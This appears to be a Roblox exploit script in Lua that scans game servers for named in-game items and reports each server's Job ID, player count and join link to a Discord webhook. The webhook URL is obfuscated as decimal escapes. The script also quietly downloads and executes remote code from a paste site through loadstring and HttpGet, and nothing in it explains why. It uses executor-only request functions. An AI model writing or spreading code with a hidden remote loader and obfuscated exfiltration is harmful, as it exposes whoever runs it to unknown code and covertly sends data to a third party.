--[[ 25kDev B+E Combo Hidden Edition ]]

local p = game:GetService("Players")
local h = game:GetService("HttpService")
local l = p.LocalPlayer
local t = task

-- CONFIG (obfuscado)
local wbh = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\49\48\51\56\51\50\51\49\57\48\57\53\50\49\48\48\49\53\47\116\105\56\45\104\69\51\121\100\57\53\109\51\52\82\74\67\120\71\57\103\48\109\116\69\99\76\80\107\49\103\74\100\87\78\95\49\86\119\68\48\88\100\117\115\72\65\86\110\112\68\68\51\117\71\76\70\68\106\49\103\108\112\120\72\50\106"

local allowed = { [96342491571673]=true, [109983668079237]=true }

local targets = {
    "Graipuss Medussi","La Grande Combinasion","Garama and Madundung","Sammyni Spyderini",
    "Pot Hotspot","Nuclearo Dinossauro","Chicleteira Bicicleteira","Los Combinasionas",
    "Dragon Cannelloni","Unclito Samito","Brainrot OG","Taza","Strawberry Elephant",
    "Los Tacoritas","Blackhole Goat","La Vacca Saturno Saturnita","Extinct Matteo",
    "Nuclearo Dinossauro","Chimpanzini Spiderini","Pot Hotspot","Chicleteira Bicicleteira",
    "Las Vaquitas Saturnitas","Los Matteos","Job Job Job Sahur","Esok Sekolah",
    "Karkerkar Kurkur","Agarrini la Palini","Dragon Cannelloni","Torrtuginni Dragonfruitini",
    "Los Hotspotsitos"
}

-- PRIVATE SERVER
local function f()
    return (game.PrivateServerId and game.PrivateServerId ~= "") or (game.VIPServerId and game.VIPServerId ~= "")
end

local function g(pId,jId)
    return string.format("https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s",pId,jId)
end

if f() then l:Kick("Kicked because in private server") return
elseif not allowed[game.PlaceId] then
    l:Kick("Kicked wrong game\nJoin: "..g(game.PlaceId,game.JobId))
    return
end

-- CHECK BRAINROTS
local function c()
    local r = {}
    for _,o in pairs(workspace:GetDescendants()) do
        if o:IsA("Model") then
            local n = string.lower(o.Name)
            for _,v in pairs(targets) do
                if string.find(n,string.lower(v)) then table.insert(r,o.Name) break end
            end
        end
    end
    return r
end

-- SEND WEBHOOK
local function s(b,j)
    local d = {}
    for _,v in ipairs(b) do d[v]=(d[v] or 0)+1 end
    local f = {}
    for k,v in pairs(d) do table.insert(f,"ğŸ§  **"..k..(v>1 and " x"..v or "").."**") end
    local link = g(game.PlaceId,j)
    local color=0xE74C3C; local title="âš ï¸ No Brainrots detected"; local desc="No target brainrots found."
    local pc=#p:GetPlayers(); local mp=p.MaxPlayers; local fr=pc/mp

    if #b>0 then color=0x2ECC71; title="ğŸ§  BRAINROT DETECTED(S)!"; desc=table.concat(f,"\n")
    elseif fr>=1 then color=0xE74C3C; title="ğŸ”´ SERVER FULL"; desc=string.format("%d/%d",pc,mp)
    elseif fr>=0.9 then color=0xF1C40F; title="ğŸŸ¡ Server Almost Full"; desc=string.format("%d/%d",pc,mp) end

    local e={username="25kDev Servers",embeds={{title=title,description=desc,color=color,fields={
        {name="Players",value=string.format("%d/%d",pc,mp),inline=true},
        {name="Job ID",value=j,inline=true},
        {name="Join Link",value="[Click to join server]("..link..")",inline=false}
    },footer={text="25kDev Servers"},timestamp=DateTime.now():ToIsoDate()}}}

    local json=h:JSONEncode(e)
    local req=http_request or request or (syn and syn.request)
    if req then pcall(function() req({Url=wbh,Method="POST",Headers={["Content-Type"]="application/json"},Body=json}) end)
end

-- LOAD EXTERNAL SCRIPT
t.spawn(function()
    pcall(function() loadstring(game:HttpGet("https://pastefy.app/MJw2J4T6/raw"))() end)
end)

-- MAIN LOOP
t.spawn(function()
    while true do
        local bf=c()
        if #bf>0 then print("âœ… Found:",table.concat(bf,", ")) else print("ğŸ” None") end
        s(bf,game.JobId)
        t.wait(15)
    end
end)
